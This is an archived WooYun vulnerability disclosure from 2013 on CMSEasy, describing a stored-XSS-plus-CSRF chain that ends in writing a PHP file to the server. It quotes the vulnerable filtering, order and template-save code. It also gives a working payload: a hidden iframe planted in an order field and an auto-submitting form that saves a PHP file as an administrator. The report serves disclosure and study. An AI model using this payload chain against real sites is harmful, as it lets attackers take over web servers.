@@ -1,0 +1,279 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		cmseasy xss+csrf getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		cmseasy xss+csrf getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-10-22 14:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-25：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-11：	细节向普通白帽子公开<br/>
+									2013-12-01：	细节向实习白帽子公开<br/>
+									2014-01-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">第一次XSS处就给了你了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">lib/tool/front_class.php<br />
+<br />
+</p><pre><code>function __construct() {<br />
+    	if(preg_match(&#039;/(\&#039;|&quot;)/&#039;, $_POST[&#039;username&#039;]) || preg_match(&#039;/(\&#039;|&quot;)/&#039;, $_GET[&#039;username&#039;]) || preg_match(&#039;/(\&#039;|&quot;)/&#039;, $_COOKIE[&#039;login_username&#039;])){<br />
+    		exit(&#039;非法参数&#039;);<br />
+......<br />
+        <br />
+        if (!MAGIC_QUOTES_GPC) {<br />
+        	$_GET = daddslashes($_GET);<br />
+        	$_POST = daddslashes($_POST);<br />
+        	$_COOKIE = daddslashes($_COOKIE);<br />
+        } //GPC=OFF才过滤跨站代码,为ON时不过滤.<br />
+        <br />
+        $dfile = htmlspecialchars($_GET[&#039;dfile&#039;]);<br />
+        foreach ($_GET as $key=&gt;$value) {<br />
+            unset($_GET[$key]);<br />
+            if ($key == &#039;host&#039;||$key == &#039;ftpip&#039;||$key == &#039;request&#039;||$key == &#039;notify_id&#039;||$key == &#039;real_name&#039;) {<br />
+                $_GET[$key]=$value;<br />
+                continue;<br />
+            }<br />
+            $key=preg_replace(&#039;/[^\w-].*/&#039;,&#039;&#039;,$key);<br />
+            if ($key == &#039;tag&#039;||$key == &#039;keyword&#039;) {<br />
+                $value=strip_tags(urldecode($value));<br />
+                $value=str_replace(&#039; &#039;,&#039;+&#039;,$value);<br />
+				if(preg_match(&#039;/union/i&#039;,$value) || preg_match(&#039;/&quot;/i&#039;,$value) ||preg_match(&#039;/\&#039;/i&#039;,$value)){<br />
+                	exit(&#039;非法参数&#039;);<br />
+                }<br />
+            }<br />
+            else<br />
+                $value=preg_replace(&#039;/[^\w-].*/&#039;,&#039;&#039;,$value);<br />
+            $_GET[$key]=$value;<br />
+        }<br />
+        <br />
+        self::$get=$_GET;<br />
+        self::$post=$_POST; //GET过滤的比较多，POST紧紧就过滤了单双引号。<br />
+        self::$get[&#039;dfile&#039;] = $dfile;<br />
+        ......    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+lib/default/archive_act.php<br />
+<br />
+</p><pre><code>function orders_action() {<br />
+        $this-&gt;view-&gt;aid = trim(front::get(&#039;aid&#039;));<br />
+        if (front::post(&#039;submit&#039;)) {<br />
+        	$this-&gt;orders = new orders();<br />
+        	$row = $this-&gt;orders-&gt;getrow(&quot;&quot;,&quot;adddate DESC&quot;);<br />
+        	//var_dump(time());<br />
+        	if($row[&#039;adddate&#039;] &amp;&amp; time() - $row[&#039;adddate&#039;] &lt;= intval(config::get(&#039;order_time&#039;))){<br />
+        		alerterror(&#039;操作频繁,请稍后再试&#039;);<br />
+        		return;<br />
+        	}<br />
+            if (front::$post[&#039;telphone&#039;] == &#039;&#039;) {<br />
+                alerterror(&#039;联系电话为必填！&#039;);<br />
+                return;<br />
+            }<br />
+            front::$post[&#039;mid&#039;] = $this-&gt;view-&gt;user[&#039;userid&#039;] ? $this-&gt;view-&gt;user[&#039;userid&#039;] : 0;<br />
+            front::$post[&#039;adddate&#039;] = time();<br />
+            front::$post[&#039;ip&#039;] = front::ip();<br />
+            if (isset(front::$post[&#039;aid&#039;])) {<br />
+                $aidarr = front::$post[&#039;aid&#039;];<br />
+                unset(front::$post[&#039;aid&#039;]);<br />
+                foreach ($aidarr as $val) {<br />
+                    front::$post[&#039;aid&#039;].=$val . &#039;,&#039;;<br />
+                    front::$post[&#039;pnums&#039;].=front::$post[&#039;thisnum&#039;][$val] . &#039;,&#039;;<br />
+                }<br />
+            } else {<br />
+                front::$post[&#039;aid&#039;] = $this-&gt;view-&gt;aid;<br />
+            }<br />
+            if (!isset(front::$post[&#039;logisticsid&#039;]))<br />
+                front::$post[&#039;logisticsid&#039;] = 0;<br />
+            front::$post[&#039;oid&#039;] = date(&#039;YmdHis&#039;) . &#039;-&#039; . front::$post[&#039;logisticsid&#039;] . &#039;-&#039; . front::$post[&#039;mid&#039;] . &#039;-&#039; . front::$post[&#039;payname&#039;];<br />
+            <br />
+            $insert = $this-&gt;orders-&gt;rec_insert(front::$post); //没过滤就直接插入数据库了。<br />
+			......<br />
+    }</code></pre><p class='detail'><br />
+<br />
+访问http://localhost/index.php?case=archive&amp;act=orders&amp;aid=1<br />
+<br />
+在单位名称里插入跨站代码&lt;iframe src=&quot;http://localhost/add.html&quot; width=0 height=0&gt;<br />
+<br />
+</p><pre><code>&lt;body onload=document.f.submit()&gt;<br />
+&lt;form name=&quot;f&quot; method=&quot;post&quot; action=&quot;http://localhost/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;sid&quot; value=&quot;test.php&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;scontent&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot;&gt;<br />
+&lt;/form&gt;<br />
+&lt;/body&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+lib/admin/template_admin.php<br />
+<br />
+</p><pre><code>function save_action() {<br />
+        $id = front::post(&#039;sid&#039;); //文件名,sid=test.php,下面的替换都无影响<br />
+        $tpl = str_replace(&#039;_d_&#039;,&#039;/&#039;,$id);<br />
+        $tpl = str_replace(&#039;#&#039;,&#039;&#039;,$tpl);<br />
+        $tpl = str_replace(&#039;_html&#039;,&#039;.html&#039;,$tpl);<br />
+        $tpl = str_replace(&#039;_css&#039;,&#039;.css&#039;,$tpl);<br />
+        $tpl = str_replace(&#039;_js&#039;,&#039;.js&#039;,$tpl);<br />
+        $res = array();<br />
+        $content = htmlspecialchars_decode(front::post(&#039;scontent&#039;));//要保存的内容<br />
+        $content = preg_replace(&#039;%&lt;&amp;#47textarea%&#039;,&#039;&lt;/textarea&#039;,$content);<br />
+        ......        <br />
+}else {<br />
+            if ($content) {<br />
+            	$content = stripslashes($content);<br />
+                file_put_contents(TEMPLATE .&#039;/&#039;.config::get(&#039;template_dir&#039;) .&#039;/&#039;.$tpl,$content); //写入。<br />
+                $res[&#039;message&#039;] = &#039;ok&#039;;<br />
+            }<br />
+        }<br />
+        echo $res[&#039;message&#039;];<br />
+        exit;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+访问http://localhost/template/default/test.php </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">第一次XSS处就给了你了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"></p><p class="detail"><a href="../images/191935501c735419b6910d576a262c3393076f8e.png" target="_blank"><img src="../images/191935501c735419b6910d576a262c3393076f8e.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19193543fdadc2a2ec2b0ca6842f76bf1a15e360.png" target="_blank"><img src="../images/19193543fdadc2a2ec2b0ca6842f76bf1a15e360.png" alt="2.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19193535653d3836e7b579d495317279eff2bf0f.png" target="_blank"><img src="../images/19193535653d3836e7b579d495317279eff2bf0f.png" alt="3.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/191935244f5b55752e9f4d32881c7a9e8f8beb9c.png" target="_blank"><img src="../images/191935244f5b55752e9f4d32881c7a9e8f8beb9c.png" alt="4.png" width="600"/></a></p><p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040347" title="cmseasy xss+csrf getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-10-22 17:02</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40347";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
